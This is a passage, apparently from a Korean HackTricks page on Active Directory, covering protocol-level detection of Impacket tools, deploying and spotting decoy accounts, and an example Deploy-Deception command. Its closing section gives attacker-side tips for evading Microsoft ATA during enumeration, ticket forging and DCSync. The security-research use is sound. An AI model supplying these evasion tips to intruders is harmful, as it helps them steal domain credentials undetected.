일반적인 AD tradecraft를 탐지하려면 renamed binary, service name, temporary batch file 또는 output path처럼 **operator가 제어하는 artifact**에만 의존하지 마세요. 정상적인 Windows client가 [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC 및 WMI traffic을 구성하는 방식을 baseline으로 설정한 다음, operator가 `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` 또는 `ntlmrelayx.py`를 수정한 후에도 남는 **implementation quirk**를 찾으세요.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidate**(자체 baseline으로 검증한 후):
- `auth_context_id = 79231 + ctx_id`를 사용하는 authenticated DCE/RPC
- `0xff`로 채워진 DCE/RPC authentication padding
- raw Kerberos `AP-REQ`를 SPNEGO `mechToken`에 직접 배치하는 LDAP Kerberos bind
- ASCII처럼 보이는 `ClientGuid` 값을 사용하는 SMB2/3 negotiate request
- 비표준 namespace `//./root/cimv2`를 사용하는 WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce 값
- **Correlation/scoring feature로 사용하는 편이 더 좋은 항목**:
- Sparse 또는 duplicate Kerberos etype list, 비정상적이거나 누락된 `PA-DATA`, 또는 native Windows와 다른 TGS-REQ etype ordering
- version info가 없는 NTLM Type 1 message 또는 null host name이 있는 Type 3 message
- SPNEGO 대신 DCE/RPC에 전달되는 raw NTLMSSP, 누락된 DCE/RPC verification trailer 또는 SPNEGO/Kerberos OID mismatch
- 동일한 host/user/session/time window에서 이러한 특성이 여러 개 나타나는 경우, 단일한 weak field보다 훨씬 강한 신호입니다.
- **standalone alert가 아닌 enrichment로 사용**:
- Default filename, output path, random service name, temporary batch name, default computer account name 및 tool-specific HTTP/WebDAV/RDP/MSSQL string
- 이러한 항목은 operator가 쉽게 변경할 수 있으므로 cross-protocol cluster가 의심스러운 이유를 설명하는 데 사용하는 것이 가장 좋습니다.
- **Operational note**:
- 이러한 signal 중 일부는 decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW 또는 service-side visibility가 필요합니다.
- alert로 승격하기 전에 Samba/Linux client, appliance 및 legacy software를 기준으로 검증하세요.
- baseline에 대한 신뢰도가 높아짐에 따라 detection을 enrichment -> hunting -> alerting 순서로 승격하세요.

### **Deception technique 구현**

- Deception 구현에는 password가 expire되지 않거나 Trusted for Delegation으로 표시되는 decoy user 또는 computer와 같은 trap을 설정하는 작업이 포함됩니다. 자세한 접근 방식에는 특정 privilege를 가진 user를 생성하거나 high privilege group에 추가하는 작업이 포함됩니다.<sup>[[2]](#references)</sup>
- 실용적인 예시는 다음과 같은 tool을 사용하는 것입니다: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception technique 배포에 대한 자세한 내용은 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)에서 확인할 수 있습니다.

### **Deception 식별**

- **User Object**: 의심스러운 indicator에는 비정상적인 ObjectSID, 드문 logon, creation date 및 낮은 bad password count가 포함됩니다.
- **일반적인 indicator**: 잠재적인 decoy object의 attribute를 정상 object의 attribute와 비교하면 inconsistency를 확인할 수 있습니다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)와 같은 tool은 이러한 deception을 식별하는 데 도움이 됩니다.

### **Detection system 우회**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection을 방지하려면 Domain Controller에서 session enumeration을 피합니다.
- **Ticket Impersonation**: ticket 생성에 **aes** key를 사용하면 NTLM으로 downgrade하지 않으므로 detection을 우회하는 데 도움이 됩니다.
- **DCSync Attack**: ATA detection을 피하려면 non-Domain Controller에서 실행하는 것이 좋습니다. Domain Controller에서 직접 실행하면 alert가 발생합니다.

## References

- [1] [Domain Trust 공격 가이드](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory에서 Deception을 위한 Trust 위조](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin에서 Enterprise Admin으로](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection - Active Directory Exploitation을 위한 In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec - Holy Shuck! NTLM Hash를 Wordlist로 Weaponize하기](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) - Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs - Impacket 분석](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon을 통한 Active Directory Account 탈취](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472와 관련된 Netlogon secure channel connection 변경 사항 관리 방법](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [잊혀진 Null Session 및 MS-RPC interface 탐색](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domain 간 security boundary로서의 SID filter? (Part 4) - SID filtering 우회 연구](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domain 간 security boundary로서의 SID filter? (Part 5) - Golden GMSA trust attack - child에서 parent로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domain 간 security boundary로서의 SID filter? (Part 6) - Schema change trust attack - child에서 parent로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5를 사용하여 DA에서 EA로](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS를 abuse하여 child domain admin에서 enterprise admin으로 5분 만에 escalation하기: 후속 글](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoor 설계](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
